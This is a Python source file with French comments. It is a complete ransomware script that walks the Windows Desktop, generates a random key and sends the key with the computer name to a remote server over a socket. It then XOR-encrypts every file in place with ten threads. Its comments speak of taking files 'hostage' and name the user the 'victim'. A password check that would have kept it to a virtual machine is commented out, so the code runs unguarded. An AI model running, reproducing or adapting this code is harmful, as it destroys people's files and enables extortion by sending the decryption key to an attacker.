import os
import random
import socket
from queue import Queue
from threading import Thread

"""
#_!_!_!_!_!_!_MOT DE PASSE DE SECURITE_!_!_!_!_!_!_!_
mot_de_passe = input("Verifier que vous etes sur machine virtuelle pour executer ce programme, vu les degats que peut causer sur vos donnees personnelles \n Pour des mesures de securite, veuillez enter le mot de passe: ")
if mot_de_passe != "salim":
    quit()
"""

#fonction pour crypter
def crypter(cle):
    while True:
        fichier = q.get()
        index = 0
        max_index = len(cle) - 1
        print(f'cryptage de {fichier}')
        try:
            with open(fichier, 'rb') as f:
                donnees = f.read()
            with open(fichier, 'w') as f:
                f.write('')
            for byte in donnees:
                xor_byte = byte ^ ord(cle[index])
                with open(fichier, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                if index >= max_index:
                    index = 0
                else:
                    index += 1
            print('cryptage de {fichier} reussi')
        except:
            print(f'cryptage de {fichier} non reussi')
        q.task_done()


#prendre en otage tout les fichiers au bureau 
print("scanner les fichiers...")
dir_bureau = os.environ['USERPROFILE']+'\\Desktop'
fichiers = os.listdir(dir_bureau)
fichiers_a_crypter = []
for f in fichiers:
    if os.path.isfile(f'{dir_bureau}\\{f}') and f != __file__[:-2]+'exe':
        fichiers_a_crypter.append(f'{dir_bureau}\\{f}')
print('fichiers localises')

#generer cle aleatoire
print('generer la cle...')
cle = ''
degre_cryptage = 128 // 8  #16 bit
caracteres = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789<>?,./@!'
for i in range(degre_cryptage):
    cle += random.choice(caracteres)
print('key generated')


#obtenir nom de la victime
nom_utilisateur = os.getenv('COMPUTERNAME')

#connecter au serveur
adresse_IP = '192.168.11.102'
port = 5678
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    print('connexion au serveur...')
    s.connect((adresse_IP, port))
    print('connecte! transmissin de la cle...')
    s.send(f'{nom_utilisateur} : {cle}'.encode('utf-8'))
    print('cle transmise avec succes')
    s.close()


#stocker les fichier dans une file dattente
q = Queue()
for fichier in fichiers_a_crypter:
    q.put(fichier)

#multithread pour accelerer
for i in range(10):
    thread = Thread(target=crypter, args=(cle,), daemon=True)
    thread.start()

q.join()
print('cryptage reussi')
input()